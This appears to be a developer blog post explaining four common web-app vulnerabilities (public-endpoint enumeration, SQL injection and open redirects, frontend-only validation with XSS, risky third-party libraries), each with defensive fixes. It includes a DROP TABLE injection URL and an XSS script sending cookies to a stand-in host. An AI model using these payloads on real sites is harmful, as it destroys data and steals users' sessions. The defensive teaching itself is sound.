# 4 common vulnerabilities of web apps

As software engineers we are not only concerned about code, we are also involved directly with the client to understand his point of view and to make sure that they are aware of the technical side. 

Security is one of the most important topics that we like to discuss, so in this blog post I will share 4 common security vulnerabilities in web applications, how it can be exploited and how can be prevented. 

## 1) Public Endpoints

A public endpoint does not have an authentication process so they are public to the world. Sometimes this is a requirement because we have a feature that can be accessed by anyone.

### Possible exploit: Enumeration

- Enumeration is the process of extracting information iterating over an endpoint. 

### Example

- If the web app has an endpoint that returns `true` when an email is available it can be exploited by iterating over an email list to know which email is used in your site. 
`https://example.com/email_available.json?email=mail@example.com`
A malicious agent can generate a list of emails used in your site and execute a social engineering attack, for instance impersonate your business to ask for passwords.

### Solution

- We must be aware of public endpoints and add authentication if needed.
- When that’s not possible we should add rate limiting based on the IP, to prevent the use of automatic scripts.

## 2) Unsanitized url parameters

Sanitizing is the process of cleaning, removing and validating the proper form of the parameters. An unsanitized url parameter is a vulnerability.

### Possible vulnerabilities: Open redirects & SQL injections

- Open Redirects: The http parameters are used to redirect to a new website without executing validations.

- SQL Injection: malicious SQL statements are executed using insecure entry points

### Example

- Redirect to malicious sites after some step is taken by the user.

- A web page that has a search functionality but the parameter is not sanitized, so you can add SQL statements that could be executed, in this case to delete the Users table 
`http://mysite.com/?s=something_to_search; DROP TABLE Users`

### Solutions

- Sanitize the url parameters: Remove javascript code, illegal characters, etc
- Validate that redirection from url parameters are only to your domain
- Sanitize user inputs used in your sql queries


## 3) Frontend validations

Frontend validations helps ensure users will fill out the data in the correct format, but sometimes this is not enough.

### Possible vulnerabilities: XSS & bypass validations

- An XSS (Cross site scripting) vulnerability can be used to insert malicious Javascript code.
- Frontend validations are not enough because they can be easily bypassed, intercepting the payload and changing the data.

### Examples

- Webapp where you can upload only images (not other files) but the validations are only in the frontend allowing a malicious user to intercept the payload and upload executable files, js code, etc

- A comment section in a webapp with an XSS vulnerability that can be used to steal cookies. It can insert this javascript code and each time a user loads the page it will send the cookies to a malicious site.
`<script>new Image().src="http://badsite/?s="+document.cookie;</script>`

### Solutions

- Make backend validations
- Sanitize user inputs in the in the backend to allow only valid values

## 4) Third party libraries

A third party library is a reusable component developed externally. Using external libraries has benefits like improve the development speed but it also has some drawbacks.

### Possible vulnerability : Attacks directed at the library

Modern apps use a lot of libraries and they can be a target or an attack vector into your webapp.

### Examples

- Outdated library with known vulnerabilities.
- Popular open source library hacked and updated with malicious code.

### Solutions

- Do you need the third party library? Make sure that the pros outweigh the cons when using a library. 
- Be aware of issues in your libraries. For example Github alerts you of potential vulnerabilities in js libraries. Keep them up to date.

## Conclusion

When building software we have to keep in mind the vulnerabilities that we could face, so we can prevent them in the initial stages of design and development. The trust of the users is the most valuable asset so investing in security is always recommended.  
